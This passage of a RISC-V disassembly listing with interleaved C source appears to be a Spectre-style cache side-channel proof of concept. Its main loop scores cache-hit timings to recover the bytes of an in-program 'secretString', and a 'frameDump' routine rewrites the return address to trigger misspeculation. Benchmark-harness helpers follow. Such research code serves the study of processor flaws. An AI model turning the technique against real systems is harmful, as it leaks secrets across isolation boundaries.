                if ( diff < CACHE_HIT_THRESHOLD ){
    80001430:	f8843703          	ld	a4,-120(s0)
    80001434:	03100793          	li	a5,49
    80001438:	02e7e663          	bltu	a5,a4,80001464 <main+0x1b0>
                    results[i] += 1;
    8000143c:	0001a717          	auipc	a4,0x1a
    80001440:	84470713          	addi	a4,a4,-1980 # 8001ac80 <results.2909>
    80001444:	fb043783          	ld	a5,-80(s0)
    80001448:	078e                	slli	a5,a5,0x3
    8000144a:	97ba                	add	a5,a5,a4
    8000144c:	639c                	ld	a5,0(a5)
    8000144e:	00178713          	addi	a4,a5,1
    80001452:	0001a697          	auipc	a3,0x1a
    80001456:	82e68693          	addi	a3,a3,-2002 # 8001ac80 <results.2909>
    8000145a:	fb043783          	ld	a5,-80(s0)
    8000145e:	078e                	slli	a5,a5,0x3
    80001460:	97b6                	add	a5,a5,a3
    80001462:	e398                	sd	a4,0(a5)
            for (uint64_t i = 0; i < 256; ++i){
    80001464:	fb043783          	ld	a5,-80(s0)
    80001468:	0785                	addi	a5,a5,1
    8000146a:	faf43823          	sd	a5,-80(s0)
    8000146e:	fb043703          	ld	a4,-80(s0)
    80001472:	0ff00793          	li	a5,255
    80001476:	f6e7f8e3          	bleu	a4,a5,800013e6 <main+0x132>
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
    8000147a:	fc843783          	ld	a5,-56(s0)
    8000147e:	0785                	addi	a5,a5,1
    80001480:	fcf43423          	sd	a5,-56(s0)
    80001484:	fc843703          	ld	a4,-56(s0)
    80001488:	47a5                	li	a5,9
    8000148a:	eae7f9e3          	bleu	a4,a5,8000133c <main+0x88>
        }
        
        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);
    8000148e:	f6040713          	addi	a4,s0,-160
    80001492:	f7040793          	addi	a5,s0,-144
    80001496:	86ba                	mv	a3,a4
    80001498:	863e                	mv	a2,a5
    8000149a:	10000593          	li	a1,256
    8000149e:	00019517          	auipc	a0,0x19
    800014a2:	7e250513          	addi	a0,a0,2018 # 8001ac80 <results.2909>
    800014a6:	c71ff0ef          	jal	ra,80001116 <topTwoIdx>

        if(output[0] == (int)secretString[len] || output[1] == (int)secretString[len]) 
    800014aa:	f7044683          	lbu	a3,-144(s0)
    800014ae:	00001797          	auipc	a5,0x1
    800014b2:	73a78793          	addi	a5,a5,1850 # 80002be8 <secretString>
    800014b6:	6398                	ld	a4,0(a5)
    800014b8:	fd843783          	ld	a5,-40(s0)
    800014bc:	97ba                	add	a5,a5,a4
    800014be:	0007c783          	lbu	a5,0(a5)
    800014c2:	8736                	mv	a4,a3
    800014c4:	02f70163          	beq	a4,a5,800014e6 <main+0x232>
    800014c8:	f7144683          	lbu	a3,-143(s0)
    800014cc:	00001797          	auipc	a5,0x1
    800014d0:	71c78793          	addi	a5,a5,1820 # 80002be8 <secretString>
    800014d4:	6398                	ld	a4,0(a5)
    800014d6:	fd843783          	ld	a5,-40(s0)
    800014da:	97ba                	add	a5,a5,a4
    800014dc:	0007c783          	lbu	a5,0(a5)
    800014e0:	8736                	mv	a4,a3
    800014e2:	06f71263          	bne	a4,a5,80001546 <main+0x292>
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    800014e6:	fe843703          	ld	a4,-24(s0)
    800014ea:	00001797          	auipc	a5,0x1
    800014ee:	65678793          	addi	a5,a5,1622 # 80002b40 <array1>
    800014f2:	00f705b3          	add	a1,a4,a5
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    800014f6:	00001797          	auipc	a5,0x1
    800014fa:	6f278793          	addi	a5,a5,1778 # 80002be8 <secretString>
    800014fe:	6398                	ld	a4,0(a5)
    80001500:	fd843783          	ld	a5,-40(s0)
    80001504:	97ba                	add	a5,a5,a4
    80001506:	0007c783          	lbu	a5,0(a5)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000150a:	0007861b          	sext.w	a2,a5
    8000150e:	f6043683          	ld	a3,-160(s0)
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    80001512:	f7044783          	lbu	a5,-144(s0)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001516:	0007871b          	sext.w	a4,a5
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    8000151a:	f7044783          	lbu	a5,-144(s0)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000151e:	0007851b          	sext.w	a0,a5
    80001522:	f6843803          	ld	a6,-152(s0)
                                                           hitArray[1], output[1], output[1]); 
    80001526:	f7144783          	lbu	a5,-143(s0)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000152a:	0007889b          	sext.w	a7,a5
                                                           hitArray[1], output[1], output[1]); 
    8000152e:	f7144783          	lbu	a5,-143(s0)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001532:	2781                	sext.w	a5,a5
    80001534:	e03e                	sd	a5,0(sp)
    80001536:	87aa                	mv	a5,a0
    80001538:	00001517          	auipc	a0,0x1
    8000153c:	38050513          	addi	a0,a0,896 # 800028b8 <atol+0x184>
    80001540:	5cd000ef          	jal	ra,8000230c <printf>
    80001544:	a085                	j	800015a4 <main+0x2f0>
        else 
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001546:	fe843703          	ld	a4,-24(s0)
    8000154a:	00001797          	auipc	a5,0x1
    8000154e:	5f678793          	addi	a5,a5,1526 # 80002b40 <array1>
    80001552:	00f705b3          	add	a1,a4,a5
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    80001556:	00001797          	auipc	a5,0x1
    8000155a:	69278793          	addi	a5,a5,1682 # 80002be8 <secretString>
    8000155e:	6398                	ld	a4,0(a5)
    80001560:	fd843783          	ld	a5,-40(s0)
    80001564:	97ba                	add	a5,a5,a4
    80001566:	0007c783          	lbu	a5,0(a5)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000156a:	0007861b          	sext.w	a2,a5
    8000156e:	f6043683          	ld	a3,-160(s0)
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    80001572:	f7044783          	lbu	a5,-144(s0)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001576:	0007871b          	sext.w	a4,a5
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    8000157a:	f7044783          	lbu	a5,-144(s0)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000157e:	0007851b          	sext.w	a0,a5
    80001582:	f6843803          	ld	a6,-152(s0)
                                                           hitArray[1], output[1], output[1]);  
    80001586:	f7144783          	lbu	a5,-143(s0)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000158a:	0007889b          	sext.w	a7,a5
                                                           hitArray[1], output[1], output[1]);  
    8000158e:	f7144783          	lbu	a5,-143(s0)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001592:	2781                	sext.w	a5,a5
    80001594:	e03e                	sd	a5,0(sp)
    80001596:	87aa                	mv	a5,a0
    80001598:	00001517          	auipc	a0,0x1
    8000159c:	38050513          	addi	a0,a0,896 # 80002918 <atol+0x1e4>
    800015a0:	56d000ef          	jal	ra,8000230c <printf>

        // read in the next secret 
        ++attackIdx;
    800015a4:	fe843783          	ld	a5,-24(s0)
    800015a8:	0785                	addi	a5,a5,1
    800015aa:	fef43423          	sd	a5,-24(s0)
    for(uint64_t len = 0; len < SECRET_SZ; ++len){
    800015ae:	fd843783          	ld	a5,-40(s0)
    800015b2:	0785                	addi	a5,a5,1
    800015b4:	fcf43c23          	sd	a5,-40(s0)
    800015b8:	fd843703          	ld	a4,-40(s0)
    800015bc:	47e5                	li	a5,25
    800015be:	d4e7f4e3          	bleu	a4,a5,80001306 <main+0x52>
        //printf("%s\n","stop");
    }
    return 0;
    800015c2:	4781                	li	a5,0
}
    800015c4:	853e                	mv	a0,a5
    800015c6:	70aa                	ld	ra,168(sp)
    800015c8:	740a                	ld	s0,160(sp)
    800015ca:	614d                	addi	sp,sp,176
    800015cc:	8082                	ret

00000000800015ce <frameDump>:
    800015ce:	70e2                	ld	ra,56(sp)
    800015d0:	6121                	addi	sp,sp,64
    800015d2:	10f9                	addi	ra,ra,-2
    800015d4:	00200313          	li	t1,2
    800015d8:	00431393          	slli	t2,t1,0x4
    800015dc:	d0337753          	fcvt.s.lu	fa4,t1
    800015e0:	d033f7d3          	fcvt.s.lu	fa5,t2
    800015e4:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    800015e8:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    800015ec:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    800015f0:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    800015f4:	c03793d3          	fcvt.lu.s	t2,fa5,rtz
    800015f8:	909e                	add	ra,ra,t2
    800015fa:	8082                	ret

00000000800015fc <printArray>:
#include <stdint.h>

#define static_assert(cond) switch(0) { case 0: case !!(long)(cond): ; }

static void printArray(const char name[], int n, const int arr[])
{
    800015fc:	7179                	addi	sp,sp,-48
    800015fe:	f422                	sd	s0,40(sp)
    80001600:	1800                	addi	s0,sp,48
    80001602:	fea43423          	sd	a0,-24(s0)
    80001606:	87ae                	mv	a5,a1
    80001608:	fcc43c23          	sd	a2,-40(s0)
    8000160c:	fef42223          	sw	a5,-28(s0)
  printf( " %10s :", name );
  for ( i = 0; i < n; i++ )
    printf( " %3d ", arr[i] );
  printf( "\n" );
#endif
}
    80001610:	0001                	nop
    80001612:	7422                	ld	s0,40(sp)
    80001614:	6145                	addi	sp,sp,48
    80001616:	8082                	ret

0000000080001618 <printDoubleArray>:

static void printDoubleArray(const char name[], int n, const double arr[])
{
    80001618:	7179                	addi	sp,sp,-48
    8000161a:	f422                	sd	s0,40(sp)
    8000161c:	1800                	addi	s0,sp,48
    8000161e:	fea43423          	sd	a0,-24(s0)
    80001622:	87ae                	mv	a5,a1
    80001624:	fcc43c23          	sd	a2,-40(s0)
    80001628:	fef42223          	sw	a5,-28(s0)
  printf( " %10s :", name );
  for ( i = 0; i < n; i++ )
    printf( " %g ", arr[i] );
  printf( "\n" );
#endif
}
    8000162c:	0001                	nop
    8000162e:	7422                	ld	s0,40(sp)
    80001630:	6145                	addi	sp,sp,48
    80001632:	8082                	ret

0000000080001634 <verify>:

static int verify(int n, const volatile int* test, const int* verify)
{
    80001634:	715d                	addi	sp,sp,-80
    80001636:	e4a2                	sd	s0,72(sp)
    80001638:	0880                	addi	s0,sp,80
    8000163a:	87aa                	mv	a5,a0
    8000163c:	fcb43023          	sd	a1,-64(s0)
    80001640:	fac43c23          	sd	a2,-72(s0)
    80001644:	fcf42623          	sw	a5,-52(s0)
  int i;
  // Unrolled for faster verification
  for (i = 0; i < n/2*2; i+=2)
    80001648:	fe042623          	sw	zero,-20(s0)
    8000164c:	a071                	j	800016d8 <verify+0xa4>
  {
    int t0 = test[i], t1 = test[i+1];
    8000164e:	fec42783          	lw	a5,-20(s0)
    80001652:	078a                	slli	a5,a5,0x2
    80001654:	fc043703          	ld	a4,-64(s0)
    80001658:	97ba                	add	a5,a5,a4
    8000165a:	439c                	lw	a5,0(a5)
    8000165c:	fef42423          	sw	a5,-24(s0)
    80001660:	fec42783          	lw	a5,-20(s0)
    80001664:	0785                	addi	a5,a5,1
    80001666:	078a                	slli	a5,a5,0x2
    80001668:	fc043703          	ld	a4,-64(s0)
    8000166c:	97ba                	add	a5,a5,a4
    8000166e:	439c                	lw	a5,0(a5)
    80001670:	fef42223          	sw	a5,-28(s0)
    int v0 = verify[i], v1 = verify[i+1];
    80001674:	fec42783          	lw	a5,-20(s0)
    80001678:	078a                	slli	a5,a5,0x2
    8000167a:	fb843703          	ld	a4,-72(s0)
    8000167e:	97ba                	add	a5,a5,a4
    80001680:	439c                	lw	a5,0(a5)
    80001682:	fef42023          	sw	a5,-32(s0)
    80001686:	fec42783          	lw	a5,-20(s0)
    8000168a:	0785                	addi	a5,a5,1
    8000168c:	078a                	slli	a5,a5,0x2
    8000168e:	fb843703          	ld	a4,-72(s0)
    80001692:	97ba                	add	a5,a5,a4
    80001694:	439c                	lw	a5,0(a5)
    80001696:	fcf42e23          	sw	a5,-36(s0)
    if (t0 != v0) return i+1;
    8000169a:	fe842703          	lw	a4,-24(s0)
    8000169e:	fe042783          	lw	a5,-32(s0)
    800016a2:	2701                	sext.w	a4,a4
    800016a4:	2781                	sext.w	a5,a5
    800016a6:	00f70763          	beq	a4,a5,800016b4 <verify+0x80>
    800016aa:	fec42783          	lw	a5,-20(s0)
    800016ae:	2785                	addiw	a5,a5,1
    800016b0:	2781                	sext.w	a5,a5
    800016b2:	a051                	j	80001736 <verify+0x102>
    if (t1 != v1) return i+2;
    800016b4:	fe442703          	lw	a4,-28(s0)
    800016b8:	fdc42783          	lw	a5,-36(s0)
    800016bc:	2701                	sext.w	a4,a4
    800016be:	2781                	sext.w	a5,a5
    800016c0:	00f70763          	beq	a4,a5,800016ce <verify+0x9a>
    800016c4:	fec42783          	lw	a5,-20(s0)
    800016c8:	2789                	addiw	a5,a5,2
    800016ca:	2781                	sext.w	a5,a5
    800016cc:	a0ad                	j	80001736 <verify+0x102>
  for (i = 0; i < n/2*2; i+=2)
    800016ce:	fec42783          	lw	a5,-20(s0)
    800016d2:	2789                	addiw	a5,a5,2
    800016d4:	fef42623          	sw	a5,-20(s0)
    800016d8:	fcc42783          	lw	a5,-52(s0)
    800016dc:	01f7d71b          	srliw	a4,a5,0x1f
    800016e0:	9fb9                	addw	a5,a5,a4
    800016e2:	4017d79b          	sraiw	a5,a5,0x1
    800016e6:	2781                	sext.w	a5,a5
    800016e8:	0017979b          	slliw	a5,a5,0x1
    800016ec:	0007871b          	sext.w	a4,a5
    800016f0:	fec42783          	lw	a5,-20(s0)
    800016f4:	2781                	sext.w	a5,a5
    800016f6:	f4e7cce3          	blt	a5,a4,8000164e <verify+0x1a>
  }
  if (n % 2 != 0 && test[n-1] != verify[n-1])
    800016fa:	fcc42783          	lw	a5,-52(s0)
    800016fe:	8b85                	andi	a5,a5,1
    80001700:	2781                	sext.w	a5,a5
    80001702:	cb8d                	beqz	a5,80001734 <verify+0x100>
    80001704:	fcc42783          	lw	a5,-52(s0)
    80001708:	078a                	slli	a5,a5,0x2
    8000170a:	17f1                	addi	a5,a5,-4
    8000170c:	fc043703          	ld	a4,-64(s0)
    80001710:	97ba                	add	a5,a5,a4
    80001712:	439c                	lw	a5,0(a5)
    80001714:	0007869b          	sext.w	a3,a5
    80001718:	fcc42783          	lw	a5,-52(s0)
    8000171c:	078a                	slli	a5,a5,0x2
    8000171e:	17f1                	addi	a5,a5,-4
    80001720:	fb843703          	ld	a4,-72(s0)
    80001724:	97ba                	add	a5,a5,a4
    80001726:	439c                	lw	a5,0(a5)
    80001728:	8736                	mv	a4,a3
    8000172a:	00f70563          	beq	a4,a5,80001734 <verify+0x100>
    return n;
    8000172e:	fcc42783          	lw	a5,-52(s0)
    80001732:	a011                	j	80001736 <verify+0x102>
  return 0;
    80001734:	4781                	li	a5,0
}
    80001736:	853e                	mv	a0,a5
    80001738:	6426                	ld	s0,72(sp)
    8000173a:	6161                	addi	sp,sp,80
    8000173c:	8082                	ret

000000008000173e <verifyDouble>:

static int verifyDouble(int n, const volatile double* test, const double* verify)
{
    8000173e:	711d                	addi	sp,sp,-96
    80001740:	eca2                	sd	s0,88(sp)
    80001742:	1080                	addi	s0,sp,96
    80001744:	87aa                	mv	a5,a0
    80001746:	fab43823          	sd	a1,-80(s0)
    8000174a:	fac43423          	sd	a2,-88(s0)
    8000174e:	faf42e23          	sw	a5,-68(s0)
  int i;
  // Unrolled for faster verification
  for (i = 0; i < n/2*2; i+=2)
    80001752:	fe042623          	sw	zero,-20(s0)
    80001756:	a065                	j	800017fe <verifyDouble+0xc0>
  {
    double t0 = test[i], t1 = test[i+1];
    80001758:	fec42783          	lw	a5,-20(s0)
    8000175c:	078e                	slli	a5,a5,0x3
    8000175e:	fb043703          	ld	a4,-80(s0)
    80001762:	97ba                	add	a5,a5,a4
    80001764:	239c                	fld	fa5,0(a5)
    80001766:	fef43027          	fsd	fa5,-32(s0)
    8000176a:	fec42783          	lw	a5,-20(s0)
    8000176e:	0785                	addi	a5,a5,1
    80001770:	078e                	slli	a5,a5,0x3
    80001772:	fb043703          	ld	a4,-80(s0)
    80001776:	97ba                	add	a5,a5,a4
    80001778:	239c                	fld	fa5,0(a5)
    8000177a:	fcf43c27          	fsd	fa5,-40(s0)
    double v0 = verify[i], v1 = verify[i+1];
    8000177e:	fec42783          	lw	a5,-20(s0)
    80001782:	078e                	slli	a5,a5,0x3
    80001784:	fa843703          	ld	a4,-88(s0)
    80001788:	97ba                	add	a5,a5,a4
    8000178a:	239c                	fld	fa5,0(a5)
    8000178c:	fcf43827          	fsd	fa5,-48(s0)
    80001790:	fec42783          	lw	a5,-20(s0)
    80001794:	0785                	addi	a5,a5,1
    80001796:	078e                	slli	a5,a5,0x3
    80001798:	fa843703          	ld	a4,-88(s0)
    8000179c:	97ba                	add	a5,a5,a4
    8000179e:	239c                	fld	fa5,0(a5)
    800017a0:	fcf43427          	fsd	fa5,-56(s0)
    int eq1 = t0 == v0, eq2 = t1 == v1;
    800017a4:	fe043707          	fld	fa4,-32(s0)
    800017a8:	fd043787          	fld	fa5,-48(s0)
    800017ac:	a2f727d3          	feq.d	a5,fa4,fa5
    800017b0:	00f037b3          	snez	a5,a5
    800017b4:	0ff7f793          	andi	a5,a5,255
    800017b8:	fcf42223          	sw	a5,-60(s0)
    800017bc:	fd843707          	fld	fa4,-40(s0)
    800017c0:	fc843787          	fld	fa5,-56(s0)
    800017c4:	a2f727d3          	feq.d	a5,fa4,fa5
    800017c8:	00f037b3          	snez	a5,a5
    800017cc:	0ff7f793          	andi	a5,a5,255
    800017d0:	fcf42023          	sw	a5,-64(s0)
    if (!(eq1 & eq2)) return i+1+eq1;
    800017d4:	fc442703          	lw	a4,-60(s0)
    800017d8:	fc042783          	lw	a5,-64(s0)
    800017dc:	8ff9                	and	a5,a5,a4
    800017de:	2781                	sext.w	a5,a5
    800017e0:	eb91                	bnez	a5,800017f4 <verifyDouble+0xb6>
    800017e2:	fec42783          	lw	a5,-20(s0)
    800017e6:	2785                	addiw	a5,a5,1
    800017e8:	2781                	sext.w	a5,a5
    800017ea:	fc442703          	lw	a4,-60(s0)
    800017ee:	9fb9                	addw	a5,a5,a4
    800017f0:	2781                	sext.w	a5,a5
    800017f2:	a09d                	j	80001858 <verifyDouble+0x11a>
  for (i = 0; i < n/2*2; i+=2)
    800017f4:	fec42783          	lw	a5,-20(s0)
    800017f8:	2789                	addiw	a5,a5,2
    800017fa:	fef42623          	sw	a5,-20(s0)
    800017fe:	fbc42783          	lw	a5,-68(s0)
    80001802:	01f7d71b          	srliw	a4,a5,0x1f
    80001806:	9fb9                	addw	a5,a5,a4
    80001808:	4017d79b          	sraiw	a5,a5,0x1
    8000180c:	2781                	sext.w	a5,a5
    8000180e:	0017979b          	slliw	a5,a5,0x1
    80001812:	0007871b          	sext.w	a4,a5
    80001816:	fec42783          	lw	a5,-20(s0)
    8000181a:	2781                	sext.w	a5,a5
    8000181c:	f2e7cee3          	blt	a5,a4,80001758 <verifyDouble+0x1a>
  }
  if (n % 2 != 0 && test[n-1] != verify[n-1])
    80001820:	fbc42783          	lw	a5,-68(s0)
    80001824:	8b85                	andi	a5,a5,1
    80001826:	2781                	sext.w	a5,a5
    80001828:	c79d                	beqz	a5,80001856 <verifyDouble+0x118>
    8000182a:	fbc42783          	lw	a5,-68(s0)
    8000182e:	078e                	slli	a5,a5,0x3
    80001830:	17e1                	addi	a5,a5,-8
    80001832:	fb043703          	ld	a4,-80(s0)
    80001836:	97ba                	add	a5,a5,a4
    80001838:	2398                	fld	fa4,0(a5)
    8000183a:	fbc42783          	lw	a5,-68(s0)
    8000183e:	078e                	slli	a5,a5,0x3
    80001840:	17e1                	addi	a5,a5,-8
    80001842:	fa843703          	ld	a4,-88(s0)
    80001846:	97ba                	add	a5,a5,a4
    80001848:	239c                	fld	fa5,0(a5)
    8000184a:	a2f727d3          	feq.d	a5,fa4,fa5
    8000184e:	e781                	bnez	a5,80001856 <verifyDouble+0x118>
    return n;
    80001850:	fbc42783          	lw	a5,-68(s0)
    80001854:	a011                	j	80001858 <verifyDouble+0x11a>
  return 0;
    80001856:	4781                	li	a5,0
}
    80001858:	853e                	mv	a0,a5
    8000185a:	6466                	ld	s0,88(sp)
    8000185c:	6125                	addi	sp,sp,96
    8000185e:	8082                	ret

0000000080001860 <barrier>:

static void __attribute__((noinline)) barrier(int ncores)
{
    80001860:	1101                	addi	sp,sp,-32
    80001862:	ec22                	sd	s0,24(sp)
    80001864:	1000                	addi	s0,sp,32
    80001866:	87aa                	mv	a5,a0
    80001868:	fef42623          	sw	a5,-20(s0)
  static volatile int sense;
  static volatile int count;
  static __thread int threadsense;

  __sync_synchronize();
    8000186c:	0ff0000f          	fence

  threadsense = !threadsense;
    80001870:	00022783          	lw	a5,0(tp) # 0 <_tdata_begin>
    80001874:	0017b793          	seqz	a5,a5
    80001878:	0ff7f793          	andi	a5,a5,255
    8000187c:	0007871b          	sext.w	a4,a5
    80001880:	00e22023          	sw	a4,0(tp) # 0 <_tdata_begin>
  if (__sync_fetch_and_add(&count, 1) == ncores-1)
    80001884:	0001a797          	auipc	a5,0x1a
    80001888:	c1c78793          	addi	a5,a5,-996 # 8001b4a0 <count.2896>
    8000188c:	4705                	li	a4,1
    8000188e:	0f50000f          	fence	iorw,ow
    80001892:	04e7a6af          	amoadd.w.aq	a3,a4,(a5)
    80001896:	0006879b          	sext.w	a5,a3
    8000189a:	0007871b          	sext.w	a4,a5
    8000189e:	fec42783          	lw	a5,-20(s0)
    800018a2:	37fd                	addiw	a5,a5,-1
    800018a4:	2781                	sext.w	a5,a5
    800018a6:	02f71063          	bne	a4,a5,800018c6 <barrier+0x66>
  {
    count = 0;
    800018aa:	0001a797          	auipc	a5,0x1a
    800018ae:	bf678793          	addi	a5,a5,-1034 # 8001b4a0 <count.2896>
    800018b2:	0007a023          	sw	zero,0(a5)
    sense = threadsense;
    800018b6:	00022703          	lw	a4,0(tp) # 0 <_tdata_begin>
    800018ba:	0001a797          	auipc	a5,0x1a
    800018be:	bea78793          	addi	a5,a5,-1046 # 8001b4a4 <sense.2895>
    800018c2:	c398                	sw	a4,0(a5)
    800018c4:	a829                	j	800018de <barrier+0x7e>
  }
  else while(sense != threadsense)
    800018c6:	0001                	nop
    800018c8:	0001a797          	auipc	a5,0x1a
    800018cc:	bdc78793          	addi	a5,a5,-1060 # 8001b4a4 <sense.2895>
    800018d0:	439c                	lw	a5,0(a5)
    800018d2:	0007871b          	sext.w	a4,a5
    800018d6:	00022783          	lw	a5,0(tp) # 0 <_tdata_begin>
    800018da:	fef717e3          	bne	a4,a5,800018c8 <barrier+0x68>
    ;

  __sync_synchronize();
    800018de:	0ff0000f          	fence
}
    800018e2:	0001                	nop
    800018e4:	6462                	ld	s0,24(sp)
    800018e6:	6105                	addi	sp,sp,32
    800018e8:	8082                	ret

00000000800018ea <lfsr>:

static uint64_t lfsr(uint64_t x)
{
    800018ea:	7179                	addi	sp,sp,-48
    800018ec:	f422                	sd	s0,40(sp)
    800018ee:	1800                	addi	s0,sp,48
    800018f0:	fca43c23          	sd	a0,-40(s0)
  uint64_t bit = (x ^ (x >> 1)) & 1;
    800018f4:	fd843783          	ld	a5,-40(s0)
    800018f8:	0017d713          	srli	a4,a5,0x1
    800018fc:	fd843783          	ld	a5,-40(s0)
    80001900:	8fb9                	xor	a5,a5,a4
    80001902:	8b85                	andi	a5,a5,1
    80001904:	fef43423          	sd	a5,-24(s0)
  return (x >> 1) | (bit << 62);
    80001908:	fd843783          	ld	a5,-40(s0)
    8000190c:	0017d713          	srli	a4,a5,0x1
    80001910:	fe843783          	ld	a5,-24(s0)
    80001914:	17fa                	slli	a5,a5,0x3e
    80001916:	8fd9                	or	a5,a5,a4
}
    80001918:	853e                	mv	a0,a5
    8000191a:	7422                	ld	s0,40(sp)
    8000191c:	6145                	addi	sp,sp,48
    8000191e:	8082                	ret

0000000080001920 <syscall>:

extern volatile uint64_t tohost;
extern volatile uint64_t fromhost;

static uintptr_t syscall(uintptr_t which, uint64_t arg0, uint64_t arg1, uint64_t arg2)
{
    80001920:	7171                	addi	sp,sp,-176
    80001922:	f522                	sd	s0,168(sp)
    80001924:	1900                	addi	s0,sp,176
    80001926:	f6a43c23          	sd	a0,-136(s0)
    8000192a:	f6b43823          	sd	a1,-144(s0)
    8000192e:	f6c43423          	sd	a2,-152(s0)
    80001932:	f6d43023          	sd	a3,-160(s0)
    80001936:	ff040793          	addi	a5,s0,-16
    8000193a:	f4f43c23          	sd	a5,-168(s0)
    8000193e:	f5843783          	ld	a5,-168(s0)
    80001942:	f9078793          	addi	a5,a5,-112
    80001946:	03f78793          	addi	a5,a5,63
    8000194a:	8399                	srli	a5,a5,0x6
    8000194c:	079a                	slli	a5,a5,0x6
  volatile uint64_t magic_mem[8] __attribute__((aligned(64)));
  magic_mem[0] = which;
    8000194e:	f7843703          	ld	a4,-136(s0)
    80001952:	e398                	sd	a4,0(a5)
  magic_mem[1] = arg0;
    80001954:	f7043703          	ld	a4,-144(s0)
    80001958:	e798                	sd	a4,8(a5)
  magic_mem[2] = arg1;
    8000195a:	f6843703          	ld	a4,-152(s0)
    8000195e:	eb98                	sd	a4,16(a5)
  magic_mem[3] = arg2;
    80001960:	f6043703          	ld	a4,-160(s0)
    80001964:	ef98                	sd	a4,24(a5)
  __sync_synchronize();
    80001966:	0ff0000f          	fence

  tohost = (uintptr_t)magic_mem;
    8000196a:	86be                	mv	a3,a5
    8000196c:	fffff717          	auipc	a4,0xfffff
    80001970:	69470713          	addi	a4,a4,1684 # 80001000 <tohost>
    80001974:	e314                	sd	a3,0(a4)
  while (fromhost == 0)
    80001976:	0001                	nop
    80001978:	fffff717          	auipc	a4,0xfffff
    8000197c:	6c870713          	addi	a4,a4,1736 # 80001040 <fromhost>
    80001980:	6318                	ld	a4,0(a4)
    80001982:	db7d                	beqz	a4,80001978 <syscall+0x58>
    ;
  fromhost = 0;
    80001984:	fffff717          	auipc	a4,0xfffff
    80001988:	6bc70713          	addi	a4,a4,1724 # 80001040 <fromhost>
    8000198c:	00073023          	sd	zero,0(a4)

  __sync_synchronize();
    80001990:	0ff0000f          	fence
  return magic_mem[0];
    80001994:	639c                	ld	a5,0(a5)
}
    80001996:	853e                	mv	a0,a5
    80001998:	742a                	ld	s0,168(sp)
    8000199a:	614d                	addi	sp,sp,176
    8000199c:	8082                	ret

000000008000199e <setStats>:
#define NUM_COUNTERS 2
static uintptr_t counters[NUM_COUNTERS];
static char* counter_names[NUM_COUNTERS];

void setStats(int enable)
{
    8000199e:	715d                	addi	sp,sp,-80
    800019a0:	e4a2                	sd	s0,72(sp)
    800019a2:	0880                	addi	s0,sp,80
    800019a4:	87aa                	mv	a5,a0
    800019a6:	faf42e23          	sw	a5,-68(s0)
  int i = 0;
    800019aa:	fc042e23          	sw	zero,-36(s0)
    uintptr_t csr = read_csr(name); \
    if (!enable) { csr -= counters[i]; counter_names[i] = #name; } \
    counters[i++] = csr; \
  } while (0)

  READ_CTR(mcycle);
    800019ae:	fdc42783          	lw	a5,-36(s0)
    800019b2:	0007871b          	sext.w	a4,a5
    800019b6:	4785                	li	a5,1
    800019b8:	fee7cbe3          	blt	a5,a4,800019ae <setStats+0x10>
    800019bc:	b00027f3          	csrr	a5,mcycle
    800019c0:	fcf43823          	sd	a5,-48(s0)
    800019c4:	fd043783          	ld	a5,-48(s0)
    800019c8:	fef43423          	sd	a5,-24(s0)
    800019cc:	fbc42783          	lw	a5,-68(s0)
    800019d0:	2781                	sext.w	a5,a5
    800019d2:	ef8d                	bnez	a5,80001a0c <setStats+0x6e>
    800019d4:	0001a717          	auipc	a4,0x1a
    800019d8:	aac70713          	addi	a4,a4,-1364 # 8001b480 <counters>
    800019dc:	fdc42783          	lw	a5,-36(s0)
    800019e0:	078e                	slli	a5,a5,0x3
    800019e2:	97ba                	add	a5,a5,a4
    800019e4:	639c                	ld	a5,0(a5)
    800019e6:	fe843703          	ld	a4,-24(s0)
    800019ea:	40f707b3          	sub	a5,a4,a5
    800019ee:	fef43423          	sd	a5,-24(s0)
    800019f2:	0001a717          	auipc	a4,0x1a
